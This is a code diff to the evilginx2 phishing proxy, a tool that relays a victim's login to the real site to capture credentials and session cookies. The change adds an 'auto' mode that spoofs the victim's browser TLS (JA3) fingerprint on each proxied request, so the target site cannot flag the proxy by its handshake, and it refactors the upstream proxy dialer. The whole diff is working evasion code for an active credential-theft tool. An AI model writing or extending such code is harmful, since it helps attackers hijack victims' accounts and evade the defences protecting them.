@@ -48,6 +48,8 @@ import (
 	"github.com/kgretzky/evilginx2/gophish/evilginx"
 	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 	"github.com/kgretzky/evilginx2/log"
+
+	utls "github.com/refraction-networking/utls"
 )
 
 const (
@@ -98,6 +100,12 @@ type HttpProxy struct {
 	// domain, discovered at runtime from response bodies containing real
 	// federated-IdP hostnames. Per-proxy global with last-write-wins semantics.
 	wildcardHosts sync.Map
+
+	// utlsTransports caches http.Transport instances keyed by JA3 fingerprint
+	// name. Used when ja3_fingerprint is "auto" so each request can pick the
+	// transport matching the victim's User-Agent without recreating it.
+	utlsTransports    map[string]*http.Transport
+	utlsTransportsMtx sync.RWMutex
 }
 
 func (p *HttpProxy) wildcardKey(plName, pattern string) string {
@@ -202,6 +210,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		sids:              make(map[string]int),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 		cookieName:        "", // Initialize to empty string, will be set below
+		utlsTransports:    make(map[string]*http.Transport),
 	}
 
 	// Initialize cookie name from config or generate new one
@@ -317,6 +326,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
+			// When ja3_fingerprint is "auto", pick the uTLS transport that matches
+			// the victim's User-Agent. This keeps the TLS fingerprint consistent with
+			// the browser the victim claims to be using.
+			if strings.ToLower(strings.TrimSpace(p.cfg.GetJa3Fingerprint())) == "auto" {
+				helloID := ParseUserAgentFingerprint(req.UserAgent())
+				tr := p.getUTLSTransport(helloID)
+				ctx.RoundTripper = goproxy.RoundTripperFunc(func(r *http.Request, _ *goproxy.ProxyCtx) (*http.Response, error) {
+					return tr.RoundTrip(r)
+				})
+				log.Debug("utls: auto fingerprint for UA %q -> %s", req.UserAgent(), GetFingerprintName(helloID))
+			}
 
 			// -------------------------------------------------------------------------
 			// REFACTORED: Antibot Engine Evaluation
@@ -3222,6 +3243,45 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 	return nil
 }
 
+// baseDial returns the underlying TCP dialer currently installed on the
+// goproxy transport. This preserves any upstream HTTP/SOCKS5 proxy that
+// setProxy configured.
+func (p *HttpProxy) baseDial() func(ctx context.Context, network, addr string) (net.Conn, error) {
+	if existingDial := p.Proxy.Tr.Dial; existingDial != nil {
+		return func(ctx context.Context, network, addr string) (net.Conn, error) {
+			return existingDial(network, addr)
+		}
+	}
+	return nil
+}
+
+// getUTLSTransport returns a cached http.Transport that performs outbound TLS
+// handshakes with the requested uTLS fingerprint. The transport reuses the
+// global proxy dialer (if any) so upstream proxies keep working.
+func (p *HttpProxy) getUTLSTransport(helloID utls.ClientHelloID) *http.Transport {
+	name := GetFingerprintName(helloID)
+
+	p.utlsTransportsMtx.RLock()
+	tr, ok := p.utlsTransports[name]
+	p.utlsTransportsMtx.RUnlock()
+	if ok {
+		return tr
+	}
+
+	p.utlsTransportsMtx.Lock()
+	defer p.utlsTransportsMtx.Unlock()
+
+	// Double-check after acquiring write lock.
+	if tr, ok := p.utlsTransports[name]; ok {
+		return tr
+	}
+
+	tr = NewUTLSTransport(helloID, p.baseDial())
+	p.utlsTransports[name] = tr
+	log.Debug("utls: created transport for fingerprint %s", name)
+	return tr
+}
+
 // configureUTLSFingerprinting wires the goproxy transport to perform outbound
 // TLS handshakes with a browser-style uTLS fingerprint. This changes the JA3
 // signature of connections to upstream servers from the easily identifiable
@@ -3234,22 +3294,22 @@ func (p *HttpProxy) configureUTLSFingerprinting() error {
 		return nil
 	}
 
+	// Auto mode defers fingerprint selection to request time based on the
+	// victim's User-Agent. No global transport modification is needed; instead
+	// each request gets its own RoundTripper from getUTLSTransport.
+	if strings.ToLower(strings.TrimSpace(fpName)) == "auto" {
+		log.Info("JA3 fingerprint spoofing enabled: auto (matches User-Agent)")
+		return nil
+	}
+
 	helloID, err := ParseUTLSFingerprint(fpName)
 	if err != nil {
 		return err
 	}
 
-	// Preserve any upstream proxy dialer that setProxy already installed.
-	var baseDial func(ctx context.Context, network, addr string) (net.Conn, error)
-	if existingDial := p.Proxy.Tr.Dial; existingDial != nil {
-		baseDial = func(ctx context.Context, network, addr string) (net.Conn, error) {
-			return existingDial(network, addr)
-		}
-	}
-
-	p.Proxy.Tr.DialTLSContext = UTLSDialTLSContext(helloID, baseDial)
+	p.Proxy.Tr.DialTLSContext = UTLSDialTLSContext(helloID, p.baseDial())
 	log.Info("JA3 fingerprint spoofing enabled: %s", fpName)
-	if baseDial != nil {
+	if p.baseDial() != nil {
 		log.Debug("JA3 fingerprint spoofing: preserving upstream proxy dialer")
 	}
 	return nil
